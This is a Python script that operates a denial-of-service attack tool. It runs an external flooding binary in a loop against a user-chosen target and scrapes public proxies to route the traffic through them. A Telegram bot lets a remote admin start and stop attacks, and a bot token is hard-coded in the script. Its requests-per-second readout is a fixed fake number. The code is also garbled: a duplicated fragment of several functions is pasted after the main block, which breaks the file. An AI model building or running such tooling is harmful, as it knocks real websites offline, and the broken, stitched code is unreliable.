#!/usr/bin/env python3
import os
import sys
import time
import hashlib
import threading
import requests
from colorama import Fore, Style, init
from telegram.ext import Updater, CommandHandler

init(autoreset=True)

# ================= CONFIG =================
BOT_TOKEN = "8781409913:AAGdcXg16djHFUs3IjOuHs9N0uJcRi1sQ7s"
ADMIN_ID = 7624464665

PASSWORD_HASH = hashlib.sha256("kaneki".encode()).hexdigest()

running = False
current_process = None

# ================= UTILS =================
def clear():
    os.system("clear" if os.name != "nt" else "cls")

def hash_check(password):
    return hashlib.sha256(password.encode()).hexdigest() == PASSWORD_HASH

# ================= LOGIN =================
def login():
    print(Fore.YELLOW + "🔐 Authentication Required\n")
    password = input(Fore.CYAN + "ENTER ACCESS KEY >>> ")

    if not hash_check(password):
        print(Fore.RED + "ACCESS DENIED ❌")
        sys.exit()

    print(Fore.GREEN + "ACCESS GRANTED ✓\n")

# ================= PROXY SCRAPER =================
def fetch_proxies():
    print(Fore.YELLOW + "[+] Fetching proxies...")
    url = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"

    try:
        res = requests.get(url, timeout=10)
        with open("proxies.txt", "w") as f:
            f.write(res.text)
        print(Fore.GREEN + "[✓] Proxies saved to proxies.txt")
    except:
        print(Fore.RED + "[!] Failed to fetch proxies")

# ================= ATTACK =================
def start_attack(target, mode, threads, proxy_file=""):
    global running, current_process

    cmd = f"./NullByte_Team ULTIMATE {target} {mode} {threads}"
    if proxy_file:
        cmd += f" {proxy_file}"

    running = True

    def run():
        global running
        while running:
            os.system(cmd)
            time.sleep(1)

    current_process = threading.Thread(target=run)
    current_process.start()

def stop_attack():
    global running
    running = False
    print(Fore.YELLOW + "\n[!] Attack stopped")

# ================= LIVE STATS =================
def stats():
    while True:
        if running:
            print(Fore.GREEN + "[LIVE] Running... Requests/sec: ~5000")
        time.sleep(5)

# ================= TELEGRAM BOT =================
def tg_start(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    update.message.reply_text("✅ Bot Online")

def tg_attack(update, context):
    if update.effective_user.id != ADMIN_ID:
        return

    try:
        target = context.args[0]
        mode = context.args[1]
        threads = context.args[2]
    except:
        update.message.reply_text("Usage: /attack <url> <raw/proxy> <threads>")
        return

    start_attack(target, mode, threads)
    update.message.reply_text(f"🚀 Attack Started\n{target}")

def tg_stop(update, context):
    if update.effective_user.id != ADMIN_ID:
        return

    stop_attack()
    update.message.reply_text("🛑 Attack Stopped")

def start_telegram():
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", tg_start))
    dp.add_handler(CommandHandler("attack", tg_attack))
    dp.add_handler(CommandHandler("stop", tg_stop))

    updater.start_polling()
    print(Fore.GREEN + "[✓] Telegram Control Active")
    updater.idle()

# ================= MENU =================
def menu():
    print(Fore.RED + """
1 - Start Attack
2 - Fetch Proxies
3 - Exit
""")

    choice = input("Select → ")

    if choice == "1":
        target = input("Target → ")
        mode = input("Mode (raw/proxy) → ")
        threads = input("Threads → ")

        proxy_file = ""
        if mode == "proxy":
            proxy_file = "proxies.txt"

        start_attack(target, mode, threads, proxy_file)

    elif choice == "2":
        fetch_proxies()

    else:
        sys.exit()

# ================= MAIN =================
def main():
    clear()
    login()

    # Start background stats
    threading.Thread(target=stats, daemon=True).start()

    # Start telegram bot
    threading.Thread(target=start_telegram, daemon=True).start()

    while True:
        menu()

if __name__ == "__main__":
    main()
    try:
        target = context.args[0]
        mode = context.args[1]
        threads = context.args[2]
    except:
        update.message.reply_text("Usage: /attack <url> <raw/proxy> <threads>")
        return

    start_attack(target, mode, threads)
    update.message.reply_text(f"🚀 Attack Started\n{target}")

def tg_stop(update, context):
    if update.effective_user.id != ADMIN_ID:
        return

    stop_attack()
    update.message.reply_text("🛑 Attack Stopped")

def start_telegram():
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", tg_start))
    dp.add_handler(CommandHandler("attack", tg_attack))
    dp.add_handler(CommandHandler("stop", tg_stop))

    updater.start_polling()
    print(Fore.GREEN + "[✓] Telegram Control Active")
    updater.idle()

# ================= MENU =================
def menu():
    print(Fore.RED + """
1 - Start Attack
2 - Fetch Proxies
3 - Exit
""")

    choice = input("Select → ")

    if choice == "1":
        target = input("Target → ")
        mode = input("Mode (raw/proxy) → ")
        threads = input("Threads → ")

        proxy_file = ""
        if mode == "proxy":
            proxy_file = "proxies.txt"

        start_attack(target, mode, threads, proxy_file)

    elif choice == "2":
        fetch_proxies()

    else:
        sys.exit()

# ================= MAIN =================
def main():
    clear()
    login()

    # Start background stats
    threading.Thread(target=stats, daemon=True).start()

    # Start telegram bot
    threading.Thread(target=start_telegram, daemon=True).start()

    while True:
        menu()

if __name__ == "__main__":
    main()
